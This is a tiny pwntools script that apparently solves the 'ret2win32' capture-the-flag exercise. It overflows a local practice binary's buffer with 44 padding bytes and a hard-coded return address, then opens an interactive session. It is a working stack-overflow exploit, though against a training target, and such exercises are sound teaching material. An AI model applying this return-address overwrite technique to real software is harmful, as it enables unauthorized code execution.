from pwn import *

p = process("./ret2win32")
p.recvuntil("> ")
p.sendline("A"*44+"\x59\x86\x04\x08")
p.interactive()
